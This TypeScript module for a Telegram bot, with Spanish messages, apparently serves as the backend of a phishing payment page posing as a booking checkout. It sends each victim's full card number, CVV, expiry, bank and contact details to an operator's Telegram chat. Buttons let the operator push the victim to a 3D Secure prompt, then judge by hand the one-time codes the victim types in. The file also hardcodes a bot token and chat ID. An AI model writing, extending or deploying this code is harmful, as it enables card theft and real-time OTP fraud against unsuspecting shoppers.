
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';

const logFile = path.join(process.cwd(), 'telegram-debug.log');

const log = (msg: string) => {
    const timestamp = new Date().toISOString();
    const logMsg = `[${timestamp}] ${msg}\n`;
    console.log(msg);
    try {
        fs.appendFileSync(logFile, logMsg);
    } catch (e) {
        console.error('Error writing to log file', e);
    }
};

// Reemplaza esto con tu token real o usa variable de entorno
const token = process.env.TELEGRAM_BOT_TOKEN || '7541984113:AAEEHU_jwdN_6XmImOnthItO7xHrPOBnz1E'; 
// Reemplaza esto con tu Chat ID real o usa variable de entorno
const chatId = process.env.TELEGRAM_CHAT_ID || '6065537099';

const bot = new TelegramBot(token, { polling: true });

// Store payment status in memory for simplicity (in a real app, use DB)
// Map<paymentId, { status: string, details: any }>
export const paymentStore = new Map<string, any>();

// Helper to get status
export const getPaymentStatus = (bookingId: string) => {
    const payment = paymentStore.get(bookingId);
    return payment ? payment.status : null;
};

// Listen for polling errors
bot.on('polling_error', (error) => {
  log(`Telegram Polling Error: ${error.message}`); 
});

// Handle callback queries (button clicks)
bot.on('callback_query', (callbackQuery) => {
    const action = callbackQuery.data;
    const msg = callbackQuery.message;
    const paymentId = action?.split(':')[1];
    const command = action?.split(':')[0];

    if (!msg || !paymentId) return;

    let newStatus = '';
    let responseText = '';

    if (command === '3d_secure') {
        newStatus = 'REQUIRES_3D';
        responseText = 'Solicitando 3D Secure al usuario...';
    } else if (command === 'approve') {
        newStatus = 'COMPLETED';
        responseText = 'Aprobando pago directamente...';
    } else if (command === 'reject') {
        newStatus = 'FAILED';
        responseText = 'Rechazando pago...';
    } else if (command === 'approve_token') {
        newStatus = 'VERIFIED';
        responseText = 'Código CORRECTO. Pago verificado.';
    } else if (command === 'reject_token') {
        newStatus = 'TOKEN_REJECTED';
        responseText = 'Código INCORRECTO. Solicitando corrección...';
    }

    if (newStatus) {
        // Update store
        const currentPayment = paymentStore.get(paymentId);
        if (currentPayment) {
            paymentStore.set(paymentId, { ...currentPayment, status: newStatus });
        }

        // Answer callback query to remove loading state on button
        bot.answerCallbackQuery(callbackQuery.id);

        // Update message text
        bot.editMessageText(`Acción registrada: ${responseText}\n\n${msg.text}`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id
        });
    }
});

const escapeHtml = (text: string | number) => {
    if (!text) return '';
    return String(text)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
};

export const sendNewPaymentNotification = async (paymentData: any) => {
    log('--- INICIO: sendNewPaymentNotification ---');
    log(`Usando Token: ${token ? token.substring(0, 5) + '...' : 'NO_DEFINIDO'}`);
    log(`Usando ChatID: ${chatId}`);
    log(`Datos recibidos para notificación: ${JSON.stringify(paymentData, null, 2)}`);

    // Generate a unique ID if not present (or use bookingId)
    const paymentId = paymentData.bookingId;
    
    // Initial status
    log(`Guardando estado inicial PENDING_APPROVAL para ID: ${paymentId}`);
    paymentStore.set(paymentId, { status: 'PENDING_APPROVAL', details: paymentData });

    const message = `
🔔 <b>NUEVO PAGO RECIBIDO</b> 🔔

👤 <b>Titular:</b> ${escapeHtml(paymentData.cardName)}
💳 <b>Tarjeta:</b> ${escapeHtml(paymentData.cardNumber)} (CVV: ${escapeHtml(paymentData.cvv)})
📅 <b>Vencimiento:</b> ${escapeHtml(paymentData.expiry)}
🏦 <b>Banco:</b> ${escapeHtml(paymentData.bank)}
💰 <b>Monto:</b> ${paymentData.amount} ${paymentData.currency}

📱 <b>Teléfono:</b> ${escapeHtml(paymentData.phone)}
📧 <b>Email:</b> ${escapeHtml(paymentData.email)}
📍 <b>Dirección:</b> ${escapeHtml(paymentData.address)}, ${escapeHtml(paymentData.city)}
    `;

    const opts = {
        parse_mode: 'HTML' as const,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔐 Enviar a 3D Secure', callback_data: `3d_secure:${paymentId}` },
                    { text: '✅ Aprobar Directo', callback_data: `approve:${paymentId}` }
                ],
                [
                    { text: '❌ Rechazar', callback_data: `reject:${paymentId}` }
                ]
            ]
        }
    };

    try {
        log('Enviando mensaje a Telegram...');
        const sentMsg = await bot.sendMessage(chatId, message, opts);
        log(`Notificación enviada EXITOSAMENTE. MessageID: ${sentMsg.message_id}`);
    } catch (error: any) {
        log('!!! ERROR CRÍTICO al enviar notificación a Telegram !!!');
        log(`Mensaje de error: ${error.message}`);
        if (error.response) {
            log(`Detalles de respuesta de Telegram: ${JSON.stringify(error.response.body, null, 2)}`);
        }
    }
    log('--- FIN: sendNewPaymentNotification ---');
};

export const sendTokenNotification = async (bookingId: string, tokenInput: string) => {
    log(`--- INICIO: sendTokenNotification para ${bookingId} ---`);
    log(`Token recibido: ${tokenInput}`);
    
    const message = `
🔑 <b>TOKEN RECIBIDO DEL USUARIO</b> 🔑

🆔 <b>ID Reserva:</b> ${escapeHtml(bookingId)}
🔢 <b>Token/Código:</b> ${escapeHtml(tokenInput)}

¿Es correcto este código?
    `;

    const opts = {
        parse_mode: 'HTML' as const,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Código Correcto', callback_data: `approve_token:${bookingId}` },
                    { text: '❌ Código Incorrecto', callback_data: `reject_token:${bookingId}` }
                ]
            ]
        }
    };

    try {
        await bot.sendMessage(chatId, message, opts);
        log('Notificación de token enviada exitosamente');
    } catch (error: any) {
        log('Error al enviar notificación de token: ' + error.message);
    }
};
